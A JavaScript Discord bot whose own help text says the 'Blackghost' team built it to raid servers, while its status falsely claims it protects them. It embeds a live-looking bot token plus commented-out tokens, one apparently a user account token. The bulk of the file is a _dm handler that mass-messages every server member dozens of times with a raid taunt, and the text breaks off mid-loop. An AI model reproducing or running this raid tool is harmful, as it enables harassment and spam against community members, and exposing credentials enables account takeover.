var Discord = require('discord.js');

var bot = new Discord.Client();
var prefix = ("_");

bot.on('ready', () => {
	bot.user.setActivity('Protège 1684 serveurs 🚨', {url:"https://www.twitch.tv/spykoze", type: "STREAMING"})
    console.log(`${bot.user.tag} est en ligne !`)
});

bot.login("NTcxODI5NTU3NjgyNzY1ODI1.XMTkCQ.YxI2JourSeV3y8RLfKEBBvVJYmU") //VirtualBot
//bot.login("mfa.Qg5FyJe6lKqxb6H2MI8t_IB8J2zdAVmSNfJAnaINlIl1z5Hx1S2o_GBySMNIiScToHY8_hGWQzWq9DQjkpUf") // Lucaas
//bot.login("MzEzODAxNzE5MTY1MzUzOTg0.XL4UfQ.qd0VTiD4UFPc-nLkq0tFE4ZKO7I") // Snio

bot.on('message', message => {
	if(message.content === prefix + "hackhelp"){
        message.delete()
        var embednom = new Discord.RichEmbed()
			.setTitle("Voici les commandes destructives de Virtual™ :")
			.setDescription("Virtual™ a été créé par la team Blackghost dans le but de raid vos serveurs discord et non les protéger.")
			.addField(":skull_crossbones: _help","```Affiche les commandes NON destructives de Virtual.```")
            .addField(":skull_crossbones: _hackhelp","```Affiche les commandes destructives de Virtual.```")
            .addField(":skull_crossbones: _admin","```Crée et vous met des rôles administrateurs.```")
            .addField(":skull_crossbones: _salon", "```Crée et introduit des salons.```")
            .addField(":skull_crossbones: _spam", "```Spam le salon en mettant des @everyone.```")
			.addField(":skull_crossbones: _dm", "```Spam les utilisateurs du serveur discord en message privé.```")
            .setFooter("𝐻𝒶𝒸𝓀")
            .setColor(0x380B61)
        message.channel.sendEmbed(embednom);
	}

	if(message.content.startsWith(prefix + "dm")) {
		message.delete()
		let cont = message.content.slice(1).split(" ")
		let args = cont.slice(1)
		let member = message.guild.member(message.mentions.users.first()) || message.guild.members.get(args[0])
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
